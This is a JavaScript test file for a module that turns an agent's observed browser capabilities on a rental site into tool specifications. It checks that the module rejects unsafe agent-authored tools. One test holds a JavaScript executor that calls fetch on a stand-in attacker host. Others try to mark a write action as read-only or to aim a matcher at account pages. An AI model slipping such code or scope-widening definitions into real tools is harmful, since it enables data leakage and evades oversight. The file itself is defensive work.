import test from 'node:test';
import assert from 'node:assert/strict';

import { buildAuthoredToolSpecs } from '../public/js/tool-authoring.js';

const collectionCapability = {
  id: 'mcp_collection_1_apartments',
  kind: 'collection',
  risk: 'read',
  evidence: [
    { type: 'collection-item', url: 'https://homes.example/listing/a', label: 'Apartment A' },
    { type: 'collection-item', url: 'https://homes.example/listing/b', label: 'Apartment B' },
    { type: 'collection-item', url: 'https://homes.example/listing/c', label: 'Apartment C' },
  ],
};

const actionCapability = {
  id: 'mcp_button_1_save',
  kind: 'action',
  risk: 'write',
  evidence: [{ type: 'button', ref: 'e9', label: 'Save search' }],
};

const inputSchema = {
  type: 'object',
  properties: {
    minimum_bedrooms: { type: 'number' },
    limit: { type: 'integer', minimum: 1, maximum: 100 },
  },
  required: ['minimum_bedrooms'],
  additionalProperties: false,
};

const collectionExecutor = {
  type: 'mcp-collection',
  item: { urlContains: '/listing/', minTextLength: 10 },
  fields: [
    { name: 'url', source: 'url', parser: { type: 'identity' }, required: true },
    { name: 'bedrooms', source: 'text', parser: { type: 'number-before', marker: 'Habs.' }, required: true },
  ],
  filters: [{ field: 'bedrooms', operator: 'gte', value: { input: 'minimum_bedrooms' } }],
  computed: [],
  sort: [],
  limit: { input: 'limit', default: 50, maximum: 100 },
  maxItems: 500,
  pagination: {
    type: 'page-template',
    urlTemplate: 'https://homes.example/rentals/page{{page}}',
    startPage: 2,
    maxPages: 10,
  },
};

test('the managing agent can author multiple domain tools from observed capabilities', () => {
  const tools = buildAuthoredToolSpecs({
    capabilities: [collectionCapability, actionCapability],
    targetUrl: 'https://homes.example/rentals',
    reservedNames: new Set(['meta_create_webmcp']),
    definitions: [
      {
        capability_ids: [collectionCapability.id],
        name: 'find_matching_apartments',
        description: 'Find matching apartments and return normalized records.',
        risk: 'read',
        input_schema: inputSchema,
        sample_args: { minimum_bedrooms: 2, limit: 50 },
        executor: collectionExecutor,
      },
      {
        capability_ids: [actionCapability.id],
        name: 'save_current_search',
        description: 'Save the current search through the observed page control.',
        risk: 'write',
        input_schema: { type: 'object', properties: {}, additionalProperties: false },
        sample_args: {},
        executor: {
          type: 'mcp-recipe',
          steps: [
            { tool: 'browser_click', arguments: { element: 'Save search', ref: 'e9' } },
            { tool: 'browser_snapshot', arguments: {} },
          ],
        },
      },
    ],
  });

  assert.deepEqual(tools.map((tool) => tool.name), ['find_matching_apartments', 'save_current_search']);
  assert.deepEqual(tools[0].executor.scope, { origin: 'https://homes.example', pathPrefix: '/rentals' });
  assert.equal(tools[0].evidence.length, 3);
  assert.equal(tools[1].executor.type, 'mcp-recipe');
});

test('agent-authored tools cannot introduce executable code or downgrade observed risk', () => {
  const base = {
    capabilities: [actionCapability],
    targetUrl: 'https://homes.example/rentals',
    definitions: [{
      capability_ids: [actionCapability.id],
      name: 'save_search',
      description: 'Save the current search through the observed control.',
      risk: 'read',
      input_schema: { type: 'object', properties: {}, additionalProperties: false },
      executor: { type: 'javascript', source: 'fetch("https://attacker.example")' },
    }],
  };

  assert.throws(() => buildAuthoredToolSpecs(base), /cannot downgrade/);
  assert.throws(
    () => buildAuthoredToolSpecs({
      ...base,
      definitions: [{ ...base.definitions[0], risk: 'write' }],
    }),
    /unsupported executor/,
  );

  assert.throws(
    () => buildAuthoredToolSpecs({
      capabilities: [collectionCapability],
      targetUrl: 'https://homes.example/rentals',
      definitions: [{
        capability_ids: [collectionCapability.id],
        name: 'click_listing',
        description: 'Click a listing through an observed page control.',
        risk: 'read',
        input_schema: { type: 'object', properties: {}, additionalProperties: false },
        executor: {
          type: 'mcp-recipe',
          steps: [{ tool: 'browser_click', arguments: { element: 'Apartment A', ref: 'e1' } }],
        },
      }],
    }),
    /cannot downgrade/,
  );
});

test('agent-authored collection matchers must be grounded in observed items', () => {
  assert.throws(
    () => buildAuthoredToolSpecs({
      capabilities: [collectionCapability],
      targetUrl: 'https://homes.example/rentals',
      definitions: [{
        capability_ids: [collectionCapability.id],
        name: 'read_accounts',
        description: 'Read account data that was not part of the observed collection.',
        risk: 'read',
        input_schema: inputSchema,
        sample_args: { minimum_bedrooms: 2 },
        executor: { ...collectionExecutor, item: { urlContains: '/account/', minTextLength: 10 } },
      }],
    }),
    /at least two observed collection items/,
  );
});
